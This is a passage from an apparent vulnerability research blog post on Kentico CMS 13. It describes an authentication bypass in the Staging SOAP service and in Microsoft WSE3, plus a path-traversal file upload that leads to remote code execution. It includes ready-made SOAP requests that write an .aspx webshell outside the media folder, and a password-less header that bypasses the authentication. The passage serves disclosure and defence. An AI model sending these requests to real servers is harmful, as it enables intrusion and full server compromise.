SyncServer.CheckVersion(stagingTaskData2);\n    if (!string.IsNullOrEmpty(text))\n    {\n        return text;\n    }\n    return this.ProcessSynchronizationTaskInternal(stagingTaskData2); // [3]\n}\n</code></pre><p>At , some basic checks are performed (like a license check and authentication-related checks that we’ve already fulfilled).</p><p>At , the  based deserialization is performed. It is hardened though and it allows to deserialize several types only. It can be seen that the output is expected to be of  type.</p><p>At , the deserialized object is passed to the <code>ProcessSynchronizationTaskInternal</code>.</p><p>The tl;dr is that by leveraging our Authentication Bypass, we are now able to execute synchronization functions and tasks.</p><p>This alone is a huge and complex functionality, and it took several hours to connect all the puzzle pieces. Documentation remained elusive, and thus it was all about laborious code reading.</p><p>To be completely fair, mere mortals are not supposed to interact with this API at all - rather, it is designed to be used internally between Kentico instances.</p><p>Regardless, let’s focus on the critical details for the sanity of all readers and to ensure that we get to the exciting part of today’s blogpost.</p><p>Let’s start with a sample HTTP Request that contains serialized  object fragment (some parts were removed for readability):</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 6129\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n&lt;soap:Header&gt;\n &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n    &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n    &lt;/wsse:UsernameToken&gt;\n  &lt;/wsse:Security&gt;\n&lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;\n        &lt;![CDATA[\n            &lt;SOAP-ENV:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:SOAP-ENC=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\" xmlns:SOAP-ENV=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\" xmlns:clr=\"&lt;http://schemas.microsoft.com/soap/encoding/clr/1.0&gt;\" SOAP-ENV:encodingStyle=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\"&gt;\n                &lt;SOAP-ENV:Body&gt;\n                    &lt;a1:StagingTaskData id=\"ref-1\" xmlns:a1=\"&lt;http://schemas.microsoft.com/clr/nsassem/CMS.Synchronization/CMS.Synchronization%2C%20Version%3D13.0.13.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D834b12a258f213f9&gt;\"&gt;\n                    &lt;mSystemVersion xsi:null=\"1\"/&gt;\n                    &lt;mTaskGroups xsi:null=\"1\"/&gt;\n                    &lt;_x003C_TaskType_x003E_k__BackingField&gt;CreateObject&lt;/_x003C_TaskType_x003E_k__BackingField&gt; \n                    &lt;_x003C_TaskObjectType_x003E_k__BackingField id=\"ref-4\"&gt;media.file&lt;/_x003C_TaskObjectType_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskServers_x003E_k__BackingField id=\"ref-8\"&gt;127.0.0.1&lt;/_x003C_TaskServers_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskData_x003E_k__BackingField id=\"ref-7\"&gt;&lt;![CDATA[\n                            &lt;NewDataSet&gt;\n                                &lt;ObjectTranslation&gt;\n                                    &lt;ClassName&gt;media_library&lt;/ClassName&gt;\n                                    &lt;ID&gt;1&lt;/ID&gt;\n                                    &lt;CodeName&gt;Graphics&lt;/CodeName&gt;\n                                    &lt;SiteName&gt;DancingGoatCore&lt;/SiteName&gt;\n                                    &lt;ParentID&gt;0&lt;/ParentID&gt;\n                                    &lt;GroupID&gt;0&lt;/GroupID&gt;\n                                    &lt;ObjectType&gt;media.library&lt;/ObjectType&gt;\n                                &lt;/ObjectTranslation&gt;\n                                &lt;Media_File&gt;\n                                    &lt;FileID&gt;1&lt;/FileID&gt;\n                                    &lt;FileName&gt;watchTowrPoc&lt;/FileName&gt;\n                                    &lt;FileTitle&gt;poc2&lt;/FileTitle&gt;\n                                    &lt;FileDescription&gt;watchTowr&lt;/FileDescription&gt;\n                                    &lt;FileExtension&gt;.png&lt;/FileExtension&gt;\n                                    &lt;FileMimeType&gt;application/octet-stream&lt;/FileMimeType&gt;\n                                    &lt;FilePath&gt;path/&lt;/FilePath&gt;\n                                    &lt;FileSize&gt;20&lt;/FileSize&gt;\n                                    &lt;FileGUID&gt;993e29f9-086b-4110-872f-5cff26968a7b&lt;/FileGUID&gt;\n                                    &lt;FileLibraryID&gt;1&lt;/FileLibraryID&gt;\n                                    &lt;FileSiteID&gt;1&lt;/FileSiteID&gt;\n                                    &lt;FileCreatedByUserID&gt;1&lt;/FileCreatedByUserID&gt;\n                                    &lt;FileModifiedByUserID&gt;1&lt;/FileModifiedByUserID&gt;\n                                &lt;/Media_File&gt;\n                            &lt;/NewDataSet&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskData_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskBinaryData_x003E_k__BackingField id=\"ref-5\"&gt;&lt;![CDATA[&lt;BinaryData&gt;\n                                &lt;FileName&gt;watchTowrz.aspx&lt;/FileName&gt;\n                                &lt;FileType&gt;default&lt;/FileType&gt;\n                                &lt;FileBinaryData&gt;cG9j&lt;/FileBinaryData&gt;&lt;/BinaryData&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskBinaryData_x003E_k__BackingField&gt;\n                        &lt;_x003C_TaskServers_x003E_k__BackingField xsi:null=\"1\"/&gt;\n                        &lt;!-- removed for readability --&gt;\n                    &lt;/a1:StagingTaskData&gt;\n                &lt;/SOAP-ENV:Body&gt;\n            &lt;/SOAP-ENV:Envelope&gt;\n    ]]&gt;&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>The above example request, and sample XML, contains several very important parts (with some elements snipped for brevity):</p><ul><li> - defines type of the task that we want to perform. Here, we’re executing the  task.</li><li> - type of the object that we want to use during the task execution. Here, we set it to .</li><li> - which contains XML defining the task. In this scenario, it consists of two important parts (number of parts may be different, depending on the task type and object type):<ul><li> definition - enables the task to map the Library ID to the existing Media Library.</li><li> - this part defines the  object.</li></ul></li><li> - defines a binary task data, which is optional for majority of tasks. It is relevant for the task we are performing (creation of ) though.</li></ul><p>At some point, the code path in question will reach the  method, which will retrieve data from the deserialized  object:</p><pre><code> protected virtual ICMSObject ProcessTaskInternal(StagingTaskData stagingTaskData, bool processChildren, StagingSynchronizationHandler handler)\n{\n    ICMSObject result = null;\n    using (SynchronizationActionContext synchronizationActionContext = new SynchronizationActionContext())\n    {\n        UserInfo userInfo = this.TryGetUserSynchronizator(stagingTaskData.UserGuid, stagingTaskData.UserName);\n        synchronizationActionContext.LogUserWithTask = (userInfo != null);\n        synchronizationActionContext.TaskGroups = SyncManager.GetTaskGroupsFromSentTasks(stagingTaskData.TaskGroups);\n        using (new CMSActionContext(userInfo ?? this.AdministratorUser) // [1]\n        {\n            UseGlobalAdminContext = true\n        })\n        {\n            if (string.IsNullOrEmpty(stagingTaskData.TaskData))\n            {\n                throw new InvalidOperationException(\"Missing task data.\");\n            }\n            DataSet dataSetInternal = this.GetDataSetInternal(stagingTaskData.TaskData, stagingTaskData.TaskType, stagingTaskData.TaskObjectType); // [2]\n            DataSet physicalFilesDataSet = this.GetPhysicalFilesDataSet(stagingTaskData.TaskBinaryData); // [3]\n            using (CMSActionContext cmsactionContext2 = new CMSActionContext())\n            {\n                //...\n                //...\n</code></pre><p>At , the code sets the user context. Our Authentication Bypass gives us  permissions.</p><p>At , the code retrieves  dataset, which is based on the  delivered in the serialized XML.</p><p>At , the code retrieves  dataset, which is based on the  delivered in the serialized XML.</p><p>Finally, we reach a critical portion of the the  statement:</p><pre><code>switch (stagingTaskData.TaskType) // [1]\n{\n\tcase TaskTypeEnum.UpdateDocument:\n\tcase TaskTypeEnum.CreateDocument:\n\t    this.UpdateDocument(dataSetInternal, text, processChildren);\n\t    if (DataHelper.GetIntValue(dataSetInternal.Tables[text].Rows[0], \"StepType\", 1) == 101)\n\t    {\n\t        this.ArchiveDocument(dataSetInternal, text);\n\t        goto IL_3CB;\n\t    }\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.PublishDocument:\n\t    if (DataHelper.DataSourceIsEmpty(dataSetInternal.Tables[\"CMS_VersionHistory\"]))\n\t    {\n\t        this.UpdateDocument(dataSetInternal, text, processChildren);\n\t        goto IL_3CB;\n\t    }\n\t    this.PublishDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.DeleteDocument:\n\t    this.DeleteDocument(dataSetInternal, false, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.DeleteAllCultures:\n\t    this.DeleteDocument(dataSetInternal, true, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.MoveDocument:\n\t    this.MoveDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.ArchiveDocument:\n\t    this.ArchiveDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.UpdateObject:\n\tcase TaskTypeEnum.CreateObject: // [2]\n\t    using (CMSActionContext cmsactionContext3 = new CMSActionContext())\n\t    {\n\t        cmsactionContext3.LogSynchronization = false;\n\t        cmsactionContext3.CreateVersion = false;\n\t        cmsactionContext3.UpdateTimeStamp = false;\n\t        cmsactionContext3.UpdateSystemFields = false;\n\t        result = this.UpdateObject(dataSetInternal, physicalFilesDataSet, stagingTaskData.TaskObjectType, null, processChildren, false, true); // [3]\n\t        goto IL_3CB;\n\t    }\n\t    break;\n\tcase TaskTypeEnum.DeleteObject:\n\t    break;\n\tcase TaskTypeEnum.RejectDocument:\n\t    //...\n\t    //...\n</code></pre><p>Depending on the  defined in our XML, we can execute different actions. It’s enough to look at the task types, to realize that this API really gives you a full control over CMS page.</p><ul></ul><p>It is important here that we highlight that “objects” are a very powerful concept in Kentico. Almost everything seem to be an “object” - whether it be a media file, configuration setting. Tl;dr hundreds of object types exist.</p><p>For everyone’s sake, we are going to speedrun through the next section as UpdateObject is fairly dry.</p><p>You may remember that we’ve set the  to , which translates to creating a new media file.</p><p>When we update the  object through the  method, the  method is eventually called:</p><pre><code>private string CheckAndEnsureFilePath(string siteName, string libraryFolder, string librarySubFolderPath, string fileName, string fileExtension, bool ensureUniqueFileName, out string filePath)\n{\n    string mediaLibraryFolderPath = MediaLibraryInfoProvider.GetMediaLibraryFolderPath(siteName, libraryFolder, null); // [1]\n    if (string.IsNullOrEmpty(mediaLibraryFolderPath))\n    {\n        throw new Exception(\"[MediaFileInfoProvider.CheckAndEnsureFilePath]: Physical library path doesn't exist.\");\n    }\n    string text = mediaLibraryFolderPath;\n    librarySubFolderPath = ((librarySubFolderPath != null) ? librarySubFolderPath.TrimStart(new char[]\n    {\n        CMS.IO.Path.DirectorySeparatorChar\n    }) : null);\n    if (!string.IsNullOrEmpty(librarySubFolderPath))\n    {\n        text = DirectoryHelper.CombinePath(new string[]\n        {\n            mediaLibraryFolderPath,\n            librarySubFolderPath\n        }); // [2]\n    }\n    if (!DirectoryHelper.CheckPermissions(text))\n    {\n        throw new PermissionException(string.Format(\"[MediaFileInfoProvider.CheckAndEnsureFilePath]: Access to the path '{0}' is denied.\", mediaLibraryFolderPath));\n    }\n    filePath = DirectoryHelper.CombinePath(new string[]\n    {\n        text,\n        fileName\n    }) + fileExtension; // [3]\n    if (ensureUniqueFileName)\n    {\n        filePath = MediaLibraryHelper.EnsureUniqueFileName(filePath);\n    }\n    string fileName2 = CMS.IO.Path.GetFileName(filePath);\n    string path = (librarySubFolderPath != string.Empty) ? DirectoryHelper.CombinePath(new string[]\n    {\n        librarySubFolderPath,\n        fileName2\n    }) : fileName2;\n    DirectoryHelper.EnsureDiskPath(filePath, MediaLibraryHelper.GetMediaRootFolderPath(siteName, null));\n    return CMS.IO.Path.EnsureForwardSlashes(path, false);\n}\n</code></pre><p>At , the code will retrieve a physical (filesystem) path for the media upload directory.</p><p>At , the code will append the path from , with the attacker-controlled  ( tag from our XML payload is being used to set the  argument).</p><p>At , the attacker provided file name and extension (not validated, sanitized, etc) are appended to the file path.</p><p> is the problem, and the root cause of our Remote Code Execution vulnerability - <strong> isn’t verified against path traversal sequences, allowing an attacker to exploit a trivial path traversal here to write a file to an arbitrary location of our choice</strong>. Please note that the path traversal can also be exploited at .</p><p>With all of the above, we are in a position to upload a webshell for our RCE end boss, needing only to slightly modify our  and  definitions:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 6152\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;\n        &lt;![CDATA[\n            &lt;SOAP-ENV:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:SOAP-ENC=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\" xmlns:SOAP-ENV=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\" xmlns:clr=\"&lt;http://schemas.microsoft.com/soap/encoding/clr/1.0&gt;\" SOAP-ENV:encodingStyle=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\"&gt;\n                &lt;SOAP-ENV:Body&gt;\n                    &lt;a1:StagingTaskData id=\"ref-1\" xmlns:a1=\"&lt;http://schemas.microsoft.com/clr/nsassem/CMS.Synchronization/CMS.Synchronization%2C%20Version%3D13.0.13.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D834b12a258f213f9&gt;\"&gt;\n                    &lt;mSystemVersion xsi:null=\"1\"/&gt;\n                    &lt;mTaskGroups xsi:null=\"1\"/&gt;\n                    &lt;_x003C_TaskType_x003E_k__BackingField&gt;CreateObject&lt;/_x003C_TaskType_x003E_k__BackingField&gt; \n                    &lt;_x003C_TaskObjectType_x003E_k__BackingField id=\"ref-4\"&gt;media.file&lt;/_x003C_TaskObjectType_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskServers_x003E_k__BackingField id=\"ref-8\"&gt;127.0.0.1&lt;/_x003C_TaskServers_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskData_x003E_k__BackingField id=\"ref-7\"&gt;&lt;![CDATA[\n                            &lt;NewDataSet&gt;\n                                &lt;ObjectTranslation&gt;\n                                    &lt;ClassName&gt;media_library&lt;/ClassName&gt;\n                                    &lt;ID&gt;1&lt;/ID&gt;\n                                    &lt;CodeName&gt;Graphics&lt;/CodeName&gt;\n                                    &lt;SiteName&gt;DancingGoatCore&lt;/SiteName&gt;\n                                    &lt;ParentID&gt;0&lt;/ParentID&gt;\n                                    &lt;GroupID&gt;0&lt;/GroupID&gt;\n                                    &lt;ObjectType&gt;media.library&lt;/ObjectType&gt;\n                                &lt;/ObjectTranslation&gt;\n                                &lt;Media_File&gt;\n                                    &lt;FileID&gt;1&lt;/FileID&gt;\n                                    &lt;FileName&gt;watchTowrPoc&lt;/FileName&gt;\n                                    &lt;FileTitle&gt;poc2&lt;/FileTitle&gt;\n                                    &lt;FileDescription&gt;watchTowr&lt;/FileDescription&gt;\n                                    &lt;FileExtension&gt;.aspx&lt;/FileExtension&gt;\n                                    &lt;FileMimeType&gt;application/octet-stream&lt;/FileMimeType&gt;\n                                    &lt;FilePath&gt;../../../../../../../../inetpub/wwwroot/Kentico13/CMS/CMSPages/&lt;/FilePath&gt;\n                                    &lt;FileSize&gt;20&lt;/FileSize&gt;\n                                    &lt;FileGUID&gt;993e29f9-086b-4110-872f-5cff26968a7b&lt;/FileGUID&gt;\n                                    &lt;FileLibraryID&gt;1&lt;/FileLibraryID&gt;\n                                    &lt;FileSiteID&gt;1&lt;/FileSiteID&gt;\n                                    &lt;FileCreatedByUserID&gt;1&lt;/FileCreatedByUserID&gt;\n                                    &lt;FileModifiedByUserID&gt;1&lt;/FileModifiedByUserID&gt;\n                                &lt;/Media_File&gt;\n                            &lt;/NewDataSet&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskData_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskBinaryData_x003E_k__BackingField id=\"ref-5\"&gt;&lt;![CDATA[&lt;BinaryData&gt;\n                                &lt;FileName&gt;watchTowrz.aspx&lt;/FileName&gt;\n                                &lt;FileType&gt;default&lt;/FileType&gt;\n                                &lt;FileBinaryData&gt;base64encoded-webshell-content&lt;/FileBinaryData&gt;&lt;/BinaryData&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskBinaryData_x003E_k__BackingField&gt;\n                        &lt;_x003C_TaskServers_x003E_k__BackingField xsi:null=\"1\"/&gt;\n                        &lt;!-- removed for readability --&gt;\n                    &lt;/a1:StagingTaskData&gt;\n                &lt;/SOAP-ENV:Body&gt;\n            &lt;/SOAP-ENV:Envelope&gt;\n    ]]&gt;&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>One may realize that we have shown a  definition in the first XML.</p><p>Kentico allows users to create something called a \"Media Library\". These libraries are supposed to store a group of media files. If you want to upload a media file, you need to point the upload process to some existing media library.</p><p>When we exploit this vulnerability, we also need to point our upload request to an existing media library, which is why  is needed. However, this is not a complex task when you are an admin - and it should be noted that even if you are not able to enumerate an existing library (which should be possible), you can create your own one using the same API.</p><p>Combining WT-2025-0006 with WT-2025-0007 that we’ve just walked through, we’re able to demonstrate a full-compromise chain, chaining an Authentication Bypass with our Post-Auth Remote Code Execution vulnerability - do we get bonus points for style? or @ in #darknet?</p><p>This is the entire chain flow:</p><ol><li>Bypass the authentication in the Staging Service API with WT-2025-0006.</li><li>(Optional) Create a new media library with the Staging Service (if you are not able to enumerate the existing ones).</li><li>Exploit Post-Auth Remote Code Execution (via path traversal in media file upload) with WT-2025-0011.</li></ol><p>The Kentico security team treated WT-2025-0006 Authentication Bypass seriously and delivered a patch (version 13.0.173) in 6 days.</p><p>Despite no CVE yet assigned, Kentico has taken the correct approach for their customers (kudos) and has assigned a  severity to it and published a <a href=\"https://devnet.kentico.com/download/hotfixes?ref=labs.watchtowr.com#securityBugs-v13\">following release note</a>:</p><p>However, this patch does not fix the WT-2025-0007 post-auth RCE. We theorize that, understandably, Authentication Bypass was prioritized given the context. While any RCE is painful, a post-auth RCE still has hurdles that inhibit mass exploitation.</p><p>The patch itself was very simple, yet quite effective. Specifically - instead of returning an empty password, the  method throws an exception when an invalid username is provided.</p><p>We believe this is a sensible fix, and reflects Kentico’s overall engagement.</p><p>As is a seemingly familiar feeling, we wish we could complete the blog here. Unfortunately, we can't.</p><h3>WT-2025-0011: WSE3 Tragedy</h3><p>Torn between the responsibility of writing this blog post and sourcing raccoon memes, and looking at other vulnerabilities, we decided to just give into temptation and have a wider look at the obsolete Microsoft Web Service Enhancement 3.0 library - quickly realizing how how messy it is:</p><p>It all started with the <code>Microsoft.Web.Services3.Security.Tokens.UsernameTokenManager.VerifyPassword</code> method, which we truncated for brevity in the previous section of this blog.</p><p>When we found WT-2025-0006 vulnerability, we were tunnel-visioned into exploiting the logical flaw based on a return of an empty password string. However, we completely missed a larger red flag - that we eventually noticed after soul-searching into this method for the second time.</p><p>It seems it was not wise to listen to raccoon after all. Can you spot anything weird in this code?</p><pre><code>protected virtual void VerifyPassword(UsernameToken token, string authenticatedPassword)\n{\n\tif (token == null)\n\t{\n\t\tthrow new ArgumentNullException(\"token\");\n\t}\n\tswitch (token.PasswordOption)\n\t{\n\t\tcase PasswordOption.SendNone:\n\t\t\tif (authenticatedPassword == null)\n\t\t\t{\n\t\t\t\tthrow new FormatException(SR.GetString(\"WSE566\"));\n\t\t\t}\n\t\t\tbreak;\n\t\tcase PasswordOption.SendHashed: // [1]\n\t\t\tthis.VerifyHashedPassword(token, authenticatedPassword);\n\t\t\treturn;\n\t\tcase PasswordOption.SendPlainText: // [2]\n\t\t\tthis.VerifyPlainTextPassword(token, authenticatedPassword);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t}\n}\n</code></pre><p>There are 3  statements:</p><ol></ol><p>SendNone was mysterious, and to make it even more curious - you may have observed in the aforementioned code that all the verification routines end with a .</p><p>This is critical - when the password verification fails at any step (either it's a hash or plaintext), the WSE3 library throws an exception. <strong>If  function returns, the library thinks that we have provided valid credentials.</strong></p><p>Before we continue, let us state several things.</p><blockquote>We had a hard time to decide whether this vulnerability is strictly an issue with the already obsolete Microsoft Web Service Enhancements 3.0, or is this a vulnerability that happened due to the integration issues (how the library was used). After some time, we had made a call that the root-cause exists solely in the WSE3 codebase. We cannot expect developers to read the code of libraries and look for the logical flaws (ahem, \"undocumented features\"). On the other hand, this library is obsolete for a long time, and one shouldn't be using it at the first place.</blockquote><blockquote>WSE3 was obsoleted in (we think) 2012, and it got superseded by the appropriate classes of .NET. During those 13 years, there were multiple vulnerabilities found in those .NET libraries. For instance, see this <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf?ref=labs.watchtowr.com\">great whitepaper</a> by Oleksandr Mirosh &amp; Alvaro Muñoz. Some of those vulnerabilities still exist in WSE3, as some parts of its code were re-used in .NET.</blockquote><blockquote>We only had a very brief look at WSE3, but the conclusion is very simple. <strong>If you are using it, you should stop right NOW.</strong> We noticed some vulnerabilities there and several potential logical flaws in the authentication process. It may be extremely hard to develop a non-vulnerable integration with the WSE3 libraries. Let's treat the forthcoming paragraphs as an example of WSE3 logical flaw. There may be more of them.</blockquote><p>To sum up, it seems that if we would be able to reach the  verification method with the  option, we should be able to bypass the authentication. How can one do that? We need to investigate the  tag parsing. WSE3 parses the  tag with the <code>Microsoft.Web.Services3.Security.Tokens.UsernameToken.LoadXml</code> method:</p><pre><code>public override void LoadXml(XmlElement element)\n{\n    ...\n    this._passwordOption = PasswordOption.SendNone; // [1]\n    this._key = null;\n    if (element.HasChildNodes)\n    {\n        foreach (object obj2 in element.ChildNodes) // [2]\n        {\n            XmlNode xmlNode = (XmlNode)obj2;\n            if (xmlNode is XmlElement)\n            {\n                XmlElement xmlElement = xmlNode as XmlElement;\n                if (xmlElement != null)\n                {\n                    if (xmlElement.NamespaceURI == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\")\n                    {\n                        string localName;\n                        if ((localName = xmlElement.LocalName) != null)\n                        {\n                            if (localName == \"Username\")\n                            {\n                                this._username = Utility.GetNodeText(xmlElement, true);\n                                continue;\n                            }\n                            if (!(localName == \"Password\")) // [3]\n                            {\n                                if (localName == \"Nonce\")\n                                {\n                                    if (this._nonce != null)\n                                    {\n                                        throw new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n                                    }\n                                    try\n                                    {\n                                        this._nonce = new Nonce(xmlElement);\n                                        continue;\n                                    }\n                                    catch (Exception ex)\n                                    {\n                                        throw new SecurityFormatException(SecurityFormatException.InvalidNonce, ex);\n                                    }\n                                }\n                            }\n                            else\n                            {\n                                string text = xmlElement.GetAttribute(\"Type\"); // [4]\n                                if (text.Length == 0)\n                                {\n                                    text = \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\";\n                                }\n                                if (text == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\")\n                                {\n                                    this._password = Utility.GetNodeText(xmlElement, true);\n                                    this._passwordOption = PasswordOption.SendPlainText;\n                                    continue;\n                                }\n                                if (text == \"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\")\n                                {\n                                    this._passwordDigest = Convert.FromBase64String(Utility.GetNodeText(xmlElement, true));\n                                    this._passwordOption = PasswordOption.SendHashed;\n                                    continue;\n                                }\n                                throw new SecurityFormatException(SR.GetString(\"WSE530\", new object[]\n                                {\n                                    text\n                                })); // [5]\n                            }\n                        }\n                        this._anyElements.Add(xmlElement);\n                    }\n                    ...\n                    ...\n\n</code></pre><p>At , the code sets the  property to .</p><p>At , it iterates over XML tags.</p><p>At , it parses the  tag.</p><p>At , it retrieves the  attribute. Later, you could see that it compares it against two options: a valid  namespace and  namespace. On this basis, it sets the proper .</p><p>If the  attribute is different than the two hard-coded values, the code throws an exception at . If  is empty, it will default to the .</p><p>Looks good. What if we don't deliver the  tag though? The  will never be modified, and it will still be set to . There should still be some code that validates the XML structure, and it should refuse to accept the password-less tokens, right?</p><p>Well, kind of? Such a validation method does exist.. it just.. doesn't check for our scenario.</p><pre><code>private void CheckValid()\n{\n\tif (this._username == null || this._username.Length == 0)\n\t{\n\t\tthrow new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n\t}\n\tif (this._passwordOption == PasswordOption.SendHashed)\n\t{\n\t\tif (this._nonce == null || this.Created == DateTime.MinValue)\n\t\t{\n\t\t\tthrow new FormatException(SR.GetString(\"WSE2439\"));\n\t\t}\n\t}\n\telse if (this._passwordOption == PasswordOption.SendPlainText &amp;&amp; this._password == null)\n\t{\n\t\tthrow new FormatException(\"The incoming Username token must contain password if the password option is set to be SendPlainText.\");\n\t}\n\tif (this.Created != DateTime.MinValue &amp;&amp; DateTime.Now &lt; this.Created.Subtract(WebServicesConfiguration.SecurityConfiguration.TimeToleranceInSeconds))\n\t{\n\t\tthrow new SecurityFault(\"An invalid security token was provided\", SecurityFault.InvalidSecurityTokenCode);\n\t}\n}\n</code></pre><p>It sometimes verifies if the  is not null. It never does that when the password verification option is set to !</p><p>Now, this is some '90s-style authentication bypass! You need to provide a username… and that’s it. This is the structure of the malicious SOAP Header:</p><pre><code>&lt;soap:Header&gt;\n  &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n    &lt;wsse:UsernameToken&gt;\n      &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n    &lt;/wsse:UsernameToken&gt;\n  &lt;/wsse:Security&gt;\n&lt;/soap:Header&gt;\n</code></pre><p>Exploitation is different between these versions though:</p><ul><li>For 13.0.172 and below, one can provide any  (like ) and the vulnerability will be successfully exploited.</li><li>Between versions 13.0.173 and 13.0.177, you need to know a valid  for the Staging SOAP service.</li></ul><p>This is because the Kentico team added this exception that will be thrown if you don't provide a proper username:</p><p>Although it makes this vulnerability harder to exploit, we strongly suspect(..) you could pop multiple instances with a default username , or some basic dictionary-based bruteforcing. We have absolutely no idea if there is a way to leak 